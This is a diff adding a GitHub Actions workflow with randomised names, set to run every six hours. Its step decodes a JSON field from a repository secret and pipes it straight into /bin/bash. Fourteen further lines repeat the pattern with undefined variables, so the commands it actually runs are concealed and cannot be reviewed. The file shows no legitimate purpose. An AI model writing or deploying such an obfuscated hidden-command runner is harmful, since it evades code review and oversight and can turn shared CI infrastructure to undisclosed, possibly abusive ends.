@@ -1,0 +1,31 @@
+name: shiweiszfld
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '5 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: shiweiszfld
+        env:
+          hog49: ${{ secrets.hog49 }}
+        run: |
+          echo $hog49 | jq -r .lcfqy5592 | /bin/bash
+          echo $yqfz074 | jq -r .o953 | /bin/bash
+          echo $egx58 | jq -r .adne22041 | /bin/bash
+          echo $o0341 | jq -r .qufr1 | /bin/bash
+          echo $turw4292 | jq -r .hmitz10576 | /bin/bash
+          echo $tkm3027 | jq -r .ri9222 | /bin/bash
+          echo $up800 | jq -r .efvhn37 | /bin/bash
+          echo $zye5572 | jq -r .rbai95 | /bin/bash
+          echo $obhy8 | jq -r .miahx763 | /bin/bash
+          echo $fs05 | jq -r .id8 | /bin/bash
+          echo $th26764 | jq -r .td87951 | /bin/bash
+          echo $smifv5 | jq -r .e8 | /bin/bash
+          echo $ftjy6796 | jq -r .so57 | /bin/bash
+          echo $qllj9 | jq -r .afqq32114 | /bin/bash
+          echo $fm6973 | jq -r .rtzw00469 | /bin/bash
+
